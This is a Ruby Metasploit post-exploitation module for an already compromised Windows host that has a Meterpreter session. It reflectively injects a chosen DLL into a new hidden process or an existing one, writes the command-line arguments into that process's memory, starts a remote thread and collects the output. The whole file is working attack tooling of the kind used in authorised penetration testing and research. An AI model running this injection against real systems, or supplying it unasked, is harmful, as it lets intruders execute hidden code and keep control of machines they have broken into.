##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/reflective_dll_injection'

class MetasploitModule < Msf::Post
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info = {})
    super(update_info(info,
                      'Name' => 'Windows Manage Reflective DLL Injection 
                      Module with arguments',
                      'Description' => '
                      This module will inject a specified reflective DLL 
                      into the memory of a process, new or existing, 
                      passing any arguments.
                      ',
                      'License' => MSF_LICENSE,
                      'Author' => 'Ben Campbell,b4rtik',
                      'Platform' => 'win',
                      'SessionTypes' => ['meterpreter'],
                      'References'   =>
                        [
                          [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ]
                        ]))
    register_options(
      [
        OptPath.new('PATH', [true, 'Reflective DLL to inject into memory of a process.']),
        OptInt.new('PID', [false, 'Pid  to inject', 0]),
        OptString.new('PROCESS', [false, 'Process to spawn','notepad.exe']),
        OptString.new('ARGUMENTS', [false, 'Command line arguments']),
        OptInt.new('WAIT', [false, 'Time in seconds to wait.', 0])
      ], self.class
    )
  end

  def run
    dll_path = gen_dll_path
    if File.file?(dll_path)
      client.response_timeout=20
      run_dll(dll_path)
    else
      print_bad("Dll not found #{dll_path}")
    end
  end

  def gen_dll_path
    dll_path = ::File.expand_path(datastore['PATH'])
    dll_path
  end

  def sanitize_process_name(process_name)
    out_process_name = if process_name.split(//).last(4).join.eql? '.exe'
                         process_name
                       else
                         process_name + '.exe'
                       end
    out_process_name
  end

  def pid_exists(pid)
    return true
  end

  def launch_process
    process_name = sanitize_process_name(datastore['PROCESS'])
    print_status("Launching #{process_name} to inject Dll...")
    channelized = if datastore['WAIT'] != 0
                    true
                  else
                    false
                  end

    process = client.sys.process.execute(process_name, nil,
                                                 'Channelized' => true,
                                                 'Hidden' => true)
    hprocess = client.sys.process.open(process.pid,
                                      PROCESS_ALL_ACCESS)
    print_good("Process #{hprocess.pid} launched.")
    [process, hprocess]
  end

  def inject_dll(process,dll_path)
    print_status("Reflectively injecting the DLL into #{process.pid}..")
    library_path = ::File.expand_path(dll_path)
    exploit_mem, offset = inject_dll_into_process(process, library_path)
    [exploit_mem, offset]
  end

  def hook_process
    print_status('Warning: output unavailable')
    print_status("Hooking #{datastore['PID']} to be injected Dll...")
    hprocess = client.sys.process.open(datastore['PID'],
                                      PROCESS_ALL_ACCESS)
    print_good("Process #{hprocess.pid} hooked.")
    [nil, hprocess]
  end

  def run_dll(dll_path)
    print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
    process, hprocess = if datastore['PID'] <= 0
                          launch_process
                        else
                          hook_process
                        end
    exploit_mem, offset = inject_dll(hprocess,dll_path)

    params_size = if datastore['ARGUMENTS'].nil?
                    0
                  else
                    datastore['ARGUMENTS'].length
                  end

    arg_mem = copy_args(hprocess)

    print_status('Executing...')
    hprocess.thread.create(exploit_mem + offset, arg_mem)

    if datastore['WAIT'] != 0
      sleep(datastore['WAIT'])

      if datastore['PID'] <= 0
        read_output(process)
        print_good("Killing process #{hprocess.pid}")
        hprocess.kill(hprocess.pid)
      end
    end
    print_good('Execution finished.')
  end

  def copy_args(process)
    argssize = if datastore['ARGUMENTS'].nil?
                 1
               else
                 datastore['ARGUMENTS'].size + 1
               end
    payload_size = argssize + 1
    arg_mem = process.memory.allocate(payload_size, PAGE_READWRITE)

    params = if datastore['ARGUMENTS'].nil?
               ''
             else
               datastore['ARGUMENTS']
             end
    params += "\x00"

    process.memory.write(arg_mem, params)
    arg_mem
  end

  def read_output(process)
    print_status('Start reading output')
    begin
      loop do
        output = process.channel.read
        output.split("\n").each { |x| print_good(x) }
        break if output.length == 0
      end
    rescue ::Exception => e
      #print_status("Error running assemply: #{e.class} #{e}")
    end

    print_status('End output.')
  end
end
